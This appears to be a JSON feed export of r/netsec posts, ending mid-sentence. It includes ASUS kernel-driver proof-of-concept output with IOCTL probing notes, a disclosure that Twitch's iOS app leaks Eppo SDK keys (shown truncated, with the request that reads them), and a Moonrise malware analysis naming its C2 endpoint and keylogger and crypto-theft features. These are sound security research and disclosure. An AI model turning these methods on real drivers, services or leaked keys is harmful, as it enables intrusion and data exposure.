{"id":"3Jheb3FyCEtx7o61cc6N6","title":"Reddit - NetSec","displayTitle":"Reddit - NetSec","url":"","feedLink":"","isQuery":true,"isEmpty":false,"isHidden":false,"itemCount":10,"items":[{"title":"I used MCP Ghidra and Claude Code to find 9 kernel driver vulnerabilities on my gaming laptop","url":"https://www.credrelay.com/p/cred-relay-issue-2","date":1772291457,"author":"/u/Mindless-Study1898","guid":155053,"unread":true,"content":"<div><ul translations=\"[object Object]\"></ul></div><div><div><div><small></small></div></div></div><div><div><div><small></small></div></div></div><div><div><div><small></small></div></div></div><div><div><div><small></small></div></div></div><div><pre><code>PS C:serseffbesktop&gt; .sus_ptpfilter_poc.exe\n AsusPTPFilter.sys v16.0.0.41 PoC \nASUS Precision Touchpad Filter Driver\n7 named devices, 60+ IOCTLs, no SDDL\n\n Device Access Test +] OPENED .susHITBIService GENERIC_READ|GENERIC_WRITE\n\n...........................brevity Summary \nDevices opened:    7 / 9\nIOCTLs succeeded:  0\nTotal tests:       98\n\n VULN: 7 devices accessible from current user context</code></pre></div><div><pre><code> AsusPTPFilter.sys v16.0.0.41 PoC v3 \nASUS Precision Touchpad Filter Driver\n7 named devices, 60 IOCTLs, no SDDL\nMagic: 0xFF0000FF corrected\n\n..................brevity Summary \nDevices opened:    7 / 7\nIOCTLs succeeded:  5\nTotal tests:       5\n\n VULN CONFIRMED: 7 devices accessible - no SDDL\n VULN CONFIRMED: 5 IOCTLs succeeded from user context</code></pre></div><div><h3 translations=\"[object Object]\"></h3></div><div><pre><code>\n\nAuthorized security research on Windows kernel drivers. Find MEDIUM+ severity vulns (LPE, kernel R/W, info leak) reportable for CVEs.\n\n for RE. \nCross-compile:  Deploy:  Each driver gets  dir with  and  subdirectory\n\n — dangerous primitives determine attack surface:\n, , , ,  — trace DriverEntry → IoCreateDevice. Extract device name and SDDL string.\n without SDDL = weak default ACL = accessible to standard users\n with  = admin-only\n\n\nDriverEntry → MajorFunction[14] (IRP_MJ_DEVICE_CONTROL) → IOCTL dispatch handler\n\n — Direct switch on IoControlCode\n — Array of  entries (16 bytes each) in .rdata. Count often returned by a hardcoded function.\n — 2-3 levels deep: per-device dispatch → per-IOCTL sub-dispatch → leaf handler\n\n IOCTL code, required buffer sizes (handlers check EXACT sizes), magic header values, what it does, which user-controlled values become offsets/addresses/sizes.\n\npiVar1[2] == -0xffff01    // Ghidra shows this (SIGNED)\n-0xffff01 = 0xFF0000FF    // Two's complement — THIS is what you send\n Match exact buffer sizes from handler checks\n Set magic values in correct positions\n Test read-only operations first, writes second\n Try device open with: ,  only,  only, then zero access\n — determines severity\n\n 2=device not found, 5=access denied (has SDDL), 31=handler rejected (wrong magic/size), 32=already open# &lt;driver&gt;.sys v&lt;version&gt; - Research Notes\nResearcher/Driver/Version/SHA256/Vendor PSIRT/Signing/Device path\n\n## Architecture — [DriverEntry flow, device creation, dispatch]\n## Imports — [security-relevant imports table]\n## IOCTL Surface — [code | handler | purpose | sizes | danger]\n## Vulnerability — [CWE, CVSS vector + score, root cause, impacts, fix]\n## PoC Results — [paste actual output]\n</code></pre></div>","contentLength":2505,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1rh50yi/i_used_mcp_ghidra_and_claude_code_to_find_9/"},{"title":"The Forgotten Bug: How a Node.js Core Design Flaw Enables HTTP Request Splitting","url":"https://r3verii.github.io/cve/2026/02/27/nodejs-toctou.html","date":1772215129,"author":"/u/r3verii","guid":154654,"unread":true,"content":"<div><p>Deep dive into a TOCTOU vulnerability in Node.js's ClientRequest.path that bypasses CRLF validation and enables Header Injection and HTTP Request Splitting across 7+ major HTTP libraries totaling 160M+ weekly downloads</p></div>   submitted by   <a href=\"https://www.reddit.com/user/r3verii\"> /u/r3verii </a>","contentLength":248,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1rgdw7w/the_forgotten_bug_how_a_nodejs_core_design_flaw/"},{"title":"Twitch Ships Server-Side Eppo Keys in Its iOS App, Exposing Its Entire Product Roadmap","url":"https://www.buchodi.com/twitch-ships-server-side-eppo-keys-in-its-ios-app-exposing-its-entire-product-roadmap/","date":1772198801,"author":"/u/AdTemporary2475","guid":154555,"unread":true,"content":"<p><strong>How a one-character configuration mistake turns feature flags into a competitive intelligence feed</strong></p><p>The Twitch iOS application initializes the Eppo feature flagging SDK (now a Datadog product) using server-side SDK Keys instead of Client Tokens. This means every flag configuration is returned to the device in plaintext: flag names, variation values, allocation percentages, targeting rules, A/B test structures, and experiment status.</p><p>Two distinct SDK keys were observed in network traffic from the Twitch iOS app. Together they return over 260 production feature flags across Twitch's Production environment. Across a two-week observation window, 12 Twitch iOS users generated 208 flag configuration requests, confirming that these configurations are fetched automatically, repeatedly, and at scale by the app's normal operation.</p><p>The result is not a list of boolean toggles. It is a real-time, continuously updated window into Twitch's product strategy.</p><p>Before the technical details, here is what these unobfuscated flags reveal. None of this has been publicly disclosed by Twitch or Amazon:</p><ul><li><strong>Twitch is testing viewer-triggered ad breaks</strong> (), a 50/50 A/B test launched February 26, 2026. If viewers choose when to watch ads instead of being interrupted, it rewrites Twitch's entire relationship with its audience.</li><li><strong>Amazon product listings are live inside Twitch streams</strong> for e.l.f. Cosmetics, Dove, Razer, Revlon, L'Oréal, NYX, Meta Quest, Bazooka, and others, with ASINs, campaign IDs, and per-brand measurement holdouts baked into the flag configuration.</li><li><strong>Turbo has a dedicated growth engineering team.</strong> Nine sequential placement tests, a nested experiment pitting \"signup upsell\" against \"acquisition,\" a 30% targeted discount, and a custom chat color upsell. The ad-free tier is no longer an afterthought.</li><li><strong>A friendly fraud ML model is deployed to 90% of users</strong>, 2FA is being skipped for 99.98% of new creators, and the complete community gift sub pricing curve (discount tiers, quantity breakpoints, margin ratios) is readable in the JSON payload.</li><li><strong>An \"Elevate Prime 2026\" experiment</strong> with seven variants is fully configured but not yet launched. Five strategies to convert free viewers into Prime subscribers.</li><li> for a February 2026 event is hardcoded: tydollasign, funnymike, Im_Dontai, and 15 other handles.</li></ul><p>All of this from two misconfigured SDK keys.</p><p>Eppo provides two types of credentials for SDK initialization:  and . They are functionally identical with one critical difference: when a Client Token is used, the configuration payload is obfuscated. Flag names are hashed, variation values are encoded, and targeting rules are not human-readable.</p><p>Eppo's own documentation is explicit:</p><blockquote>SDK keys and Client Tokens are the same functionality keys, except config always is obfuscated when Client Tokens are used. Therefore, the main application of the Client Tokens is SDK clients requesting configurations for <strong>clients such as browsers or mobile applications</strong>. Meanwhile, the primary application of the SDK keys is on .</blockquote><p>And from the SDK introduction:</p><blockquote>For client SDKs, this configuration is obfuscated to ensure that end users cannot reverse engineer what flags are active, or what targeting logic is in place.</blockquote><p>Twitch's iOS application uses server-side keys. Two distinct keys were observed in network traffic:</p><pre><code>Key 1: 3mv-BKCSZJDyZr...\nKey 2: jfJjDAgpy-B7j5...\n</code></pre><p>Key 1 returns 146 flags spanning web, mobile, and cross-platform features. Key 2 returns 132 flags, predominantly iOS-specific. Nine flags appear in both. Both return  in the response header, the explicit marker that the payload is unobfuscated:</p><pre><code>{\n  \"createdAt\": \"2026-02-27T08:45:24.609Z\",\n  \"format\": \"SERVER\",\n  \"environment\": {\n    \"name\": \"Production\"\n  },\n  \"flags\": { ... }\n}\n</code></pre><p>Had Client Tokens been used, this field would read  and every flag key, variation, and rule would be hashed. Instead, the entire configuration (flag names, experiment structures, targeting conditions, JSON payloads with ASINs and pricing tables) is returned as human-readable JSON.</p><p>The endpoint is hosted on Twitch's CDN (), requires no authentication beyond the key itself, and is not rate-limited:</p><pre><code>GET /eppo/api/flag-config/v1/config\n    ?sdkName=ios-debug\n    &amp;sdkVersion=4.0.1\n    &amp;apiKey=[KEY]\nHost: assets.twitch.tv\n</code></pre><p>Once a key is observed in network traffic, it can be used to poll from any HTTP client indefinitely. Changes Twitch makes to their flag configuration are reflected within minutes.</p><h2>What feature flags encode</h2><p>In a mature experimentation platform like Eppo, each flag carries a , a human-readable string like <code>is_user_in_friendly_fraud_group</code> or . : the possible states, revealing whether something is a simple rollout or a multi-arm experiment. : who sees what at what percentage, distinguishing active A/B tests (50/50 with logging) from graduated features (100% treatment, no logging). : user IDs, channel IDs, app versions, staff flags. : structured data including Amazon ASINs, pricing ratios, promotion schedules, and URL configurations.</p><p>When unobfuscated, the configuration file reads like an internal product strategy document.</p><h2>Monetization: 30+ simultaneous experiments</h2><p>Over 30 flags across both keys are dedicated to purchase flow optimization, the single largest cluster in the configuration. Twitch is not iterating on monetization. It is running a systematic sweep of every variable in the commerce stack.</p><p>The checkout page has a five-way A/B test () experimenting with \"suggested payment method\" placement: left vs. right, card opened vs. collapsed. Apple Pay on web is in a separate A/B test. Venmo is hidden for 90% of users with a 10% holdout still logging, either underperforming or carrying unfavorable processing economics. Xsolla banners are live. Even the landscape orientation of the iOS app is being tested for commerce layout: <code>ios_com_landscape_ingress_v2</code> runs three variants (\"buttons over,\" \"prioritize gifting,\" and control) with logging.</p><p>Bits purchasing has its own conversion funnel. One-click checkout in the top nav (50/50 with logging). Repeat buyer promos (50/50 with logging). A  flag that has already graduated to 100%. That experiment concluded and shipped. The internal logic is visible in the allocation: more surfaces for purchase entry points equals more spending, validated by data.</p><p>Gift subs are scaling. 200-unit and 1,000-unit bundles are enabled. A  flag with four variants tests gamified tiers. A spender rewards experiment () tests 100 Bits vs. 250 Bits rewards against control, measuring exactly how much bonus currency changes purchasing behavior.</p><p>And then there is <code>prominent-entry-hardcoding</code>, which contains the complete community gift pricing ratio table in its JSON payload: discount tiers at 35% and 50%, quantity breakpoints at 5, 10, 25, 50, 100, and 150 gifts, and separate pricing curves for minimum, intermediate, and maximum tiers. This is internal commerce economics, the margin structure of community gift subs, served to every device.</p><h2>Turbo: nine experiments to find every conversion surface</h2><p>Twitch Turbo has historically received minimal product investment. The flag data shows a different reality for 2026.</p><p><code>turbo-february-experiments</code> splits traffic 50/50 between \"turbo-signup-upsell\" and \"turbo-acquisition,\" two different growth hypotheses tested head-to-head. Within the signup-upsell cohort,  runs a four-way test with three treatment variants against control. This is nested experimentation: one test feeds into another to decompose which strategy and which execution converts best.</p><p>On iOS, nine sequential experiments (<code>ios_com_app_start_test_v1</code> through ) each run six-way tests across \"following\", \"profile\", \"home\", \"following_plus_profile\", and \"combined\" placements, all with logging. Twitch has systematically tested every surface in the app for Turbo upsells. The winner is in the data:  has graduated  to 100%. Following and Profile won. It shipped.</p><p>The incentive stack is also being tested. A 30% targeted discount () is staged. A custom chat color upsell (<code>ios_com_turbo_custom_color_upsell</code>) runs 50/50 with logging, testing whether vanity features drive Turbo conversions. An <code>ios_com_turbo_signup_upsell</code> runs a three-way test for app versions 27.9+.</p><p>Nine placement tests, a nested experiment, a discount, a vanity upsell, and a graduated winner. This is not casual A/B testing. This is a dedicated growth engineering program.</p><p>The <code>sponsored_shopping_release</code> flag is among the most complex in the configuration. It contains Amazon ASINs for over a dozen brands, mapped to campaign IDs, segmented by marketplace, and structured with measurement holdouts.</p><p>e.l.f. Cosmetics: three ASINs, US and Canada, one campaign ID. Dove Men+Care: one ASIN per market, three campaign IDs. Razer: nine ASINs, two campaigns, one at 100% (no holdout), one at 90/10. Revlon: six ASINs, two campaign windows. L'Oréal: nine ASINs. NYX: nine ASINs. Meta Quest: single ASIN (). Bissell: single ASIN. Bazooka: eight ASINs. Amazon Basics: nine ASINs, US and Canada.</p><p>Most brands run 90/10: 90% see the shopping experience, 10% holdout for measurement. The holdout structure is consistent across brands, a standardized commerce measurement framework. The targeting rules route specific advertising campaigns to specific product sets by marketplace.</p><p>The brand list tells the story. Razer and Meta Quest are gaming-adjacent. Everything else (cosmetics, haircare, household cleaning, candy, commodity electronics) is not. Twitch is not building a merch shelf. It is building a distribution channel for Amazon's advertising business across every consumer category.</p><h2>Ads: from forced interruption to viewer choice</h2><p> launched February 26 as a 50/50 test with logging. Internal test device IDs (<code>twitch-internal-test-request</code>, <code>twitch-internal-test-request-gdads</code>) are whitelisted. If this is what the name implies, ad breaks triggered at viewer-initiated pause points rather than forced mid-rolls, it is the most significant change to Twitch's ad model since pre-rolls.</p><p>The measurement stack is being built alongside it. OM SDK viewability () runs a 50/50 test with logging. IAB compliance () is at 100%. A brand lift measurement system () is configured but disabled, in development. An  flag fires Sprig user sentiment surveys across 18 ad event types: preroll starts, midroll starts and ends, squeezeback starts and ends, parallel adplay, outstream verticals, lower thirds. Every format, surveyed.</p><p>On iOS, closed captions are coming to ads (, ). Async first feed ad requests are at 98% treatment with a 2% control holdout. A video ad countdown UI is being tested.</p><p>The direction is legible: make ads something viewers tolerate rather than endure, and make the tolerance measurable enough to justify premium CPMs.</p><h2>Fraud, security, and the growth tradeoff</h2><p><code>is_user_in_friendly_fraud_group</code> allocates 90% to a  ML variant and 10% to control, with logging. \"Friendly fraud\" (chargebacks filed by the actual buyer) is a specific and expensive category for platforms selling virtual goods. The 90/10 split with active measurement means the model is deployed and its precision is being validated before full rollout.</p><p> routes 99.98% of users to skip two-factor authentication during creator onboarding. Logging is enabled on the 0.02% holdout. Twitch determined that mandatory 2FA was killing creator conversion and made a calculated tradeoff: security friction versus funnel velocity. The tiny holdout means they are still measuring whether it holds.</p><p>Age verification is staged. <code>ios-user-age-verification</code> has staff access enabled and a general population allocation at 0% traffic, configured and ready to flip. <code>mobile_mandatory_email_verification</code> is similarly staged for both iOS and Android. These are compliance features waiting for a regulatory trigger.</p><p>Protocol-level flags block  and  URLs in auth callbacks and restrict social auth postMessage origins. Active XSS mitigations in production.</p><p> Seven variations: control, \"Subscribe Button Copy\", \"Support Panel Prime Elevation\", \"Banner/Chat Callout\", \"One-Click Prime Button\", \"DART Notification\", and combined. Fully configured. Set to control. Not yet launched. This is Amazon's next push to convert Twitch's free audience into Prime subscribers, with five strategies ready to test.</p><p>, configured, set to false. Not yet live.</p><p> An allowlist of 14 user IDs has been iterated through three development variants, with the latest deployed for app version 28.1+. Early access testing.</p><p> Enabled on iOS since version 26.3, with an extended \"stories recovery\" variant and a separate web visibility test at 50/50 with logging. Duolingo-style retention applied to viewing.</p><p> BRB Mode, Dual Camera, and Skyline Chat are all configured but dormant. IRL Broadcasting v2 is at 99.99% treatment. Shipped. A speed control feature for VOD playback is rolling out on iOS 28.2+.</p><p> An unlock schedule references quarterly dates through February 2027 with a \"3 promos per 24 hours\" rate limit.</p><p>The flags expose operational details that were never intended for external consumption.</p><p><code>ios_app_performance_monitoring</code> reveals internal release track names: \"Xarth Beta\", \"Xarth Enterprise\", \"Xarth Debug.\" Xarth is the internal codename for the Twitch iOS app.</p><p> filters  from user-agent strings in error monitoring. Twitch is aware of and filtering bot traffic from Kasada bot mitigation solvers.</p><p> targets 13 user IDs and 3 channel IDs. <code>farmland_promote_fungi_cisco</code> targets 21 IDs. <code>iOS-Theater-Portal-Allowlist</code> exposes 14 user IDs across development variants.  targets 7. These are production identifiers, resolvable to real Twitch accounts.</p><p> contains streamer handles: GlitterXplosion, WavePunk, KurtBenkert, funnymike, jakenbakeLIVE, MeesterKeem, MARI, Im_Dontai, sakurashymko, a2guapo, Silky, reemknocks, thesketchreal, Jaycinco, YonnaJay, Yugi2x, tydollasign, and twitchrivals.</p><p><code>expiring_gift_promotion_dates</code> serves a variation keyed . A misspelling of \"December\" that persists in production. It is cosmetic, but it says everything about the assumption that these configurations would never be read outside the building.</p><p>Eppo provides Client Tokens for exactly this purpose. Generate Client Tokens in Eppo's dashboard, replace the SDK Keys in the iOS app, ship an update. The endpoint, SDK integration, and evaluation logic stay the same. Only the payload format changes: from human-readable to obfuscated.</p><p>Twitch reported 35 million average daily visitors in 2024. Every iOS installation that initializes the Eppo SDK fetches these configurations automatically. Over a two-week observation window, 12 Twitch iOS users were observed generating 208 flag configuration requests across both keys. The iOS-specific key () alone accounted for 198 events from 9 users, averaging over 20 config fetches per user. The cross-platform key () was observed from 5 users.</p><p>Once a key is observed in network traffic, it can be used to poll from any HTTP client. The  timestamps confirm the configurations are regenerated with current data. Flags from both keys show modifications as recent as February 26–27, 2026.</p><p>Feature flags are the operational layer between product strategy and user experience. They encode what a company is building, who they are building it for, which hypotheses they are testing, and which bets they have already made. When the configuration that controls all of this is served unobfuscated to every mobile device, the flag infrastructure does not just manage the product. It documents it, publicly, in real time.</p>","contentLength":15377,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1rg6mid/twitch_ships_serverside_eppo_keys_in_its_ios_app/"},{"title":"Bypassing Apache FOP Postscript Escaping to reach GhostScript","url":"https://offsec.almond.consulting/bypassing-apache-fop-escaping-to-reach-ghostscript.html","date":1772195349,"author":"/u/AlmondOffSec","guid":154525,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1rg5de8/bypassing_apache_fop_postscript_escaping_to_reach/"},{"title":"Uncovering a Global macOS Malware Campaign","url":"https://defensendepth.substack.com/p/the-ghost-in-the-annotations","date":1772190970,"author":"/u/RiddleMeDisk","guid":154554,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1rg3zmd/uncovering_a_global_macos_malware_campaign/"},{"title":"We scanned 6,500+ ClawHub skills. 36% have security flaws. Built a Free Community run scanner to catch them before they execute","url":"https://clawned.io/","date":1772178562,"author":"/u/kinso1338","guid":154404,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1rg0ijo/we_scanned_6500_clawhub_skills_36_have_security/"},{"title":"New Malware - Moonrise Analysis","url":"https://evalian.co.uk/inside-a-new-malware-trojan-moonrise/","date":1772135753,"author":"/u/Deciqher_","guid":154195,"unread":true,"content":"<h2 aria-level=\"2\"></h2><table><thead><tr></tr></thead><tbody><tr></tr><tr><td>ED5471D42BEF6B32253E9C1ABA49B01B8282FD096AD0957ABCF1A1E27E8F7551</td></tr></tbody></table><ul></ul><ul></ul><p>Ghidra’s import summary confirms:</p><ul><li>Statically linked runtime</li><li>Build ID and module metadata preserved</li></ul><h2>WebSocket command and control architecture</h2><p>One of the most important discoveries appears immediately when reviewing symbol references. In Ghidra’s symbol tree, we see multiple references to:</p><p>github.com/gorilla/websocket.(*Dialer).Dial</p><p>The reference window shows:</p><ul><li>Runtime method references</li></ul><p>This confirms Moonrise explicitly invokes the Gorilla WebSocket Dialer to initiate a connection. Gorilla WebSocket is a legitimate Go library used in production web applications. It handles HTTP upgrade handshakes and maintains persistent bidirectional sockets. In the code paths reviewed, Moonrise appears to favour a persistent WebSocket channel rather than simple periodic HTTP polling.</p><h2>The hard-coded C2 endpoint</h2><p>Within the raw data section labelled DAT_0073289d, ASCII decoding reveals:</p><p>ws[:]//193[.]23[.]199.88[:]8765</p><p>This is a hard-coded WebSocket command-and-control (C2) endpoint embedded directly in the Moonrise binary. In practical terms, this gives us a concrete infrastructure indicator and also helps explain how the earlier Gorilla WebSocket dialer logic is intended to be used. Rather than dynamically generating destinations at runtime, the sample contains a fixed operator-controlled endpoint that the malware can dial immediately.</p><p>Several observations can be made from this string alone. First, the sample uses ws:// rather than wss://, which indicates an unencrypted WebSocket channel in the code path analysed. That matters operationally because the WebSocket handshake and the traffic won’t be protected by TLS, making network inspection and protocol-aware detection easier than it would be with encrypted wss:// traffic.</p><p>Second, the C2 appears to be statically embedded rather than resolved dynamically. In the functions reviewed, there is no evidence of domain generation (DGA), rotating domains, or obvious string obfuscation around this endpoint. This doesn’t make the malware unsophisticated overall, but it may indicate one of two things: either this sample reflects an earlier or rapidly-developed build, or the operator has prioritised functionality over infrastructure stealth in this stage of the campaign.</p><p>This finding also lines up with the behaviour observed in analysis tooling. ANYRUN telemetry reportedly shows an HTTP 101 Switching Protocols response from this IP and port, which is consistent with a successful WebSocket upgrade handshake. Put together with the Gorilla WebSocket dialer references and decompiled Dial() call, the hard-coded ws[:]//193[.]23[.]199[.]88[:]8765 string provides a clear link between Moonrise’s code-level implementation and its live C2 communications model.</p><h2>Connection initialisation and global session handling</h2><p>The decompiled main_f2 function provides a clearer view of how Moonrise establishes and manages its command-and-control session. In this routine, the malware allocates a Gorilla WebSocket dialer object (runtime.newobject), invokes github.com/gorilla/websocket.(*Dialer).Dial(self), and then stores the returned connection object in a global variable (DAT_0096d360).</p><p>This is an important architectural detail. Rather than creating a short-lived socket for a single transaction, Moonrise appears to initialise a shared connection object that can be referenced by other routines. In the decompiled output, the assignment to DAT_0096d360 is visible immediately after the Dial() call, indicating that the result of the WebSocket handshake is preserved for later use rather than discarded.</p><p>That design choice is reinforced by cross-reference analysis of DAT_0096d360, which shows the same global value being read and written across multiple functions.</p><p>In practical terms, this suggests Moonrise separates connection establishment from later command processing and response transmission. This is consistent with an interactive remote-control model in which the malware maintains session state and reuses a live channel for ongoing tasking.</p><p>For defenders, this matters because it changes how traffic may appear on the wire. Instead of repeated short outbound connections to a C2 endpoint, Moonrise may establish one longer-lived WebSocket session and exchange multiple command/response messages over that channel.</p><p>That pattern can be easier to miss in environments tuned primarily for periodic HTTP beaconing, but it can also create stronger detection opportunities around long-duration outbound WebSocket connections to suspicious IPs and ports.</p><h2>Continuous command processing loop</h2><p>This decompiled routine appears to represent the core of Moonrise’s runtime command-handling behaviour. After the WebSocket connection is established, the malware enters a while (true) loop, indicating that it is designed to remain active and continuously wait for operator tasking rather than execute a single command and exit.</p><p>At the start of each iteration, Moonrise updates timing values and calls SetReadDeadline(…) on the WebSocket connection. This is a small but important implementation detail. It suggests the author accounted for connection stalls and blocking behaviour, allowing the client to recover or terminate cleanly if the C2 stops responding. In other words, this is not just a minimal proof-of-concept socket read. It shows deliberate session handling.</p><p>The function then calls github.com/gorilla/websocket.(*Conn).ReadMessage(…) to retrieve a full WebSocket message frame. Immediately afterwards, the code checks for an error condition and breaks the loop if the read fails. That flow is consistent with a persistent operator session where commands are received over a long-lived channel until the connection is interrupted.</p><p>Most importantly, the received message buffer is passed into encoding/json.Unmarshal(data, v). This demonstrates that Moonrise is not processing simple plaintext commands. Instead, it expects structured JSON payloads.</p><p>The decompiled field references that follow, including Type, Command, and Data, strongly indicate a defined command schema for tasking and responses. From an analysis perspective, this is a key finding because it shows Moonrise uses an application-layer protocol on top of WebSockets rather than ad hoc string parsing.</p><h2>JSON command schema revealed in strings</h2><p>One of the most useful reverse engineering wins in Moonrise is that its command protocol is not only JSON-based, but also highly readable in both static strings and decompiled handler logic. In the decompiled code shown here, Moonrise constructs and parses JSON objects using explicit field names such as type, commandId, and history, rather than opaque numeric opcodes or heavily obfuscated blobs. This makes protocol reconstruction significantly easier and gives defenders a clearer view of how the malware organises tasking and responses.</p><p>The same code path also reveals feature-specific JSON structures. In particular, a deserialised structure containing crypto and address fields is highlighted, which strongly supports the conclusion that Moonrise includes cryptocurrency-related handling logic (consistent with clipboard hijacking or wallet address substitution workflows). This is an important analytical point because it moves the assessment beyond generic “info-stealer” behaviour and into identifiable operator functionality.</p><p>What makes this finding especially valuable is that it shows these strings in context. Rather than merely existing in the binary, the field names are actively used in encoding/json.Unmarshal(…) and map assignment routines, demonstrating that Moonrise uses a structured command schema with reusable envelopes (type, commandId) and nested payloads (history, crypto, address).</p><p>From a defensive perspective, this increases the likelihood that network or memory artefacts can be parsed and correlated to specific malware capabilities during incident response.</p><h2>Outbound reporting via WriteJSON</h2><p>Moonrise does not only receive commands over WebSocket, it also sends structured responses back to the operator using the same channel. In the decompiled function main_f10 shown here, the malware retrieves the global WebSocket connection object (DAT_0096d360) and prepares a write operation before calling github.com/gorilla/websocket.(*Conn).WriteJSON(…). This matters because it confirms Moonrise is using native JSON serialisation for outbound task results rather than manually building byte streams or simple text responses.</p><p>Several behavioural cues are visible in this function. First, the code checks whether the global connection pointer is non-null before attempting to write. If the connection exists, it sets a write deadline and then invokes WriteJSON, indicating the authors anticipated network delays or stalled sockets and built basic timeout handling into the client. That kind of defensive programming is common in legitimate software, but in malware it also improves session reliability during long-lived operator interactions.</p><p>The function also includes a failure path that returns an error when the connection object is unavailable (visible in the decompile as a nil-style error return). This matters analytically because it suggests Moonrise’s internal task handlers are written around a reusable “send result” routine rather than each capability implementing its own network output logic. This usually means command handlers can produce structured result objects and pass them into a common reporting function, making the malware easier to extend with new capabilities.</p><p>Moonrise’s use of WriteJSON is more than a coding convenience, it exposes the operator experience. This is not a crude one-way stealer that dumps data and exits. It looks designed for an interactive workflow where the server issues a command, the client executes it, and a structured response is returned immediately. That architecture aligns with surveillance-style tooling and makes the malware operationally flexible without requiring a separate exfiltration channel.</p><h2>Host registration and fingerprinting</h2><p>After establishing the WebSocket session, Moonrise appears to build an initial host registration payload that fingerprints the infected system and prepares it for operator tasking. In the decompiled main_f2 logic, the malware constructs a JSON-like map and populates fields including type, os, hostname, os_full, ip, user_uid, and data.</p><p>The presence of os::os.hostname() is especially useful evidence here, because it shows the malware actively querying the local machine name rather than relying only on static configuration or previously cached values.</p><p>This is an important behavioural marker. Moonrise is not simply beaconing a “hello” packet, it is assembling structured host metadata that can be used by an operator to identify, group, and prioritise infected endpoints. In practical terms, that allows a threat actor to quickly distinguish test systems from real user machines, decide what follow-on modules to run, and tailor commands based on the host environment.</p><p>The same code path also feeds this structured object into the outbound reporting routine (main_f10), which we already identified as using Gorilla WebSocket’s WriteJSON(…).</p><p>That linkage strongly supports the conclusion that Moonrise performs an explicit registration/fingerprinting step early in execution, sending host details to the C2 before entering its longer-lived command loop.</p><p>From a defender’s perspective, this registration pattern is useful because it creates a predictable early-execution sequence: connect to WebSocket C2, collect host identity fields, then transmit a structured JSON registration object.</p><h2>Live surveillance capability</h2><p>One of the most important parts of the Moonrise analysis is that the malware does not appear to be limited to simple remote command execution. The decompiled command-handling logic shows evidence of live surveillance-oriented features, including keylogger control paths, clipboard-related data structures, and JSON fields associated with crypto/address handling.</p><p>Put together, these indicators suggest Moonrise is designed to support sustained operator interaction and data collection on an infected host, rather than functioning as a basic one-shot downloader or loader.</p><p>A key observation is that Moonrise appears to implement a command dispatcher that branches behaviour based on incoming command names. In the decompiled handler path (main_f15), we can see string comparison logic (runtime.cmpstring) against specific command values, including a highlighted comparison for “keylogger_stop”.</p><p>This is a strong indicator that Moonrise includes explicit lifecycle controls for a keylogging component. In practical terms, this means the operator can likely start or stop telemetry collection on demand, which is more consistent with an interactive surveillance implant than with opportunistic commodity malware that simply logs everything continuously.</p><p>I have not fully reversed every handler branch here, so the command list should be treated as partial.</p><p>The same handler path also shows evidence of structured response generation, rather than ad hoc string output. In the decompiled logic, Moonrise builds a JSON-like response object with fields such as commandId, success, and history before passing it to the outbound reporting routine.</p><p>The presence of a commandId field is particularly useful because it implies operator task tracking: the C2 can issue a command, and the implant can return a result linked to that exact request. This is a hallmark of a more organised command-and-control protocol, and it makes Moonrise operationally easier for an attacker to manage at scale.</p><p>The history field is especially interesting when viewed alongside references to main.ClipboardEntry___Slice_type and slice conversion logic (runtime.convTslice(…)). This suggests Moonrise is not just capturing single events in isolation, but may be aggregating or returning collections of surveillance records, potentially including clipboard activity or keylogging history.</p><p>In a real intrusion workflow, this gives the operator richer context about what the user is doing over time, including copied credentials, pasted commands, wallet addresses, or other sensitive text-based content.</p><p>Moonrise’s decompiled logic also contains a particularly important detail of structure definition with JSON-tagged fields for crypto and address, alongside encoding/json.Unmarshal(…) into that struct. This is one of the strongest static-analysis indicators supporting crypto-theft-related behaviour.</p><p>The key point is not merely that the strings “crypto” and “address” exist in the binary, but that Moonrise appears to define a dedicated parsed structure for them. That implies the malware is expecting structured command data or configuration related to cryptocurrency workflows, rather than handling those terms as incidental UI text or unrelated library artefacts.</p><p>At a behavioural level, this supports a plausible operational use case in which the malware receives a command containing cryptocurrency-related parameters (for example, a wallet type and target address), then applies follow-on logic tied to clipboard content, address replacement, or monitoring.</p><p>Static analysis alone does not prove the exact runtime implementation of address replacement in every branch, but the presence of explicit crypto/address JSON schema handling materially strengthens the case that Moonrise was built with crypto-focused theft or interception workflows in mind.</p><p>This is precisely the type of capability that makes the malware more dangerous to both individual users and small businesses, where copied wallet addresses and payment details are common attack targets.</p><p>Another detail that makes Moonrise more operationally mature than a simplistic implant is the way surveillance outputs appear to be normalised into the same outbound communication pattern already identified elsewhere in the sample.</p><p>Rather than opening separate connections or writing custom exfiltration logic for each feature, the malware appears to reuse its persistent WebSocket channel and serialise results through the same reporting routine (main_f10, which calls Gorilla WebSocket’s WriteJSON(…)). This design is efficient for the attacker and helps explain how Moonrise can support multiple capabilities while maintaining a consistent C2 protocol.</p><p>For defenders and analysts, this architecture creates several useful detection and hunting angles. First, command-and-response JSON patterns over a persistent WebSocket session may generate distinguishable message shapes, especially when command names or response keys such as commandId, success, and history are visible in memory, telemetry, or decrypted traffic captures.</p><p>Second, clipboard monitoring and keylogger controls are often associated with follow-on suspicious behaviour on endpoints, such as repeated clipboard access, user input capture, or bursts of outbound reporting shortly after high-value user interaction.</p><p>Third, crypto/address-related command schemas should immediately raise the priority of triage, because they indicate financial theft potential rather than generic system reconnaissance.</p><h2>IP infrastructure analysis</h2><p>Initial analysis of the Trojan shows repeated connections to 193[.]23[.]199[.]88 over TCP port 8765. OSINT references to Cobalt Strike-related samples suggest the IP has been used in broader malicious activity, but this alone does not prove the Moonrise C2 is Cobalt Strike.</p><p>OSINT records also associate the IP with Kyonix Networks Limited (AS210457), indicating it is part of hosted datacentre infrastructure rather than a residential endpoint. This is consistent with how many threat actors deploy command-and-control services, often on VPS or shared hosting environments.</p><p>At the time of analysis, the host did not present obviously malicious services on common web ports, and direct interaction with port 22 (SSH) and 3389 (RDP) timed out. However, this does not reduce suspicion in the context of the Moonrise sample, because the 